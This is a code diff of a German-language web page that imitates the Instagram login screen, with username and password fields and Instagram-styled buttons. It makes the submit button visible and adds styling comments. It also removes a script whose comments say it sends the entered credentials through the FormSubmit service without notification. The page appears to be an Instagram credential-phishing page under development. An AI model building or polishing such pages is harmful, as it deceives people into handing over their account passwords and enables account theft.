@@ -42,19 +42,21 @@
       border-color: #0095f6;
       outline: none;
     }
+    /* Instagram-typischer Login-Button */
     .login-btn {
       width: 100%;
       padding: 10px;
-      background-color: #0095f6;
+      background-color: #0095f6; /* Blau für Instagram */
       color: white;
       border: none;
       border-radius: 3px;
       font-size: 16px;
       cursor: pointer;
+      font-weight: bold;
       margin-top: 10px;
     }
     .login-btn:hover {
-      background-color: #007bb5;
+      background-color: #007bb5; /* Dunkleres Blau für Hover */
     }
     .forgot-password {
       font-size: 12px;
@@ -114,7 +116,9 @@
       
       <input type="text" id="username" class="input-field" name="Benutzername" placeholder="Benutzername" required>
       <input type="password" id="password" class="input-field" name="Passwort" placeholder="Passwort" required>
-      <button type="submit" class="login-btn" style="display:none;">Einloggen</button>
+      
+      <!-- Der Login-Button im Instagram-Stil -->
+      <button type="submit" class="login-btn">Einloggen</button>
     </form>
 
     <!-- Forgot password link -->
@@ -130,26 +134,6 @@
       <p>Kein Konto? <a href="#">Registrieren</a></p>
     </div>
   </div>
-
-  <script>
-    // Validierung und Senden der E-Mail über FormSubmit
-    const form = document.getElementById("loginForm");
-
-    form.addEventListener("submit", function(event) {
-      event.preventDefault();  // Verhindert das normale Absenden des Formulars
-
-      const username = document.getElementById("username").value;
-      const password = document.getElementById("password").value;
-
-      // Optional: Einfache Validierung (z. B. prüfen, ob beide Felder ausgefüllt sind)
-      if (username === "" || password === "") {
-        alert("Bitte geben Sie sowohl Benutzername als auch Passwort ein.");
-      } else {
-        // Das Formular wird nun automatisch abgesendet, ohne Benachrichtigung
-        form.submit(); // Das Formular wird jetzt über FormSubmit gesendet
-      }
-    });
-  </script>
 
 </body>
 </html>
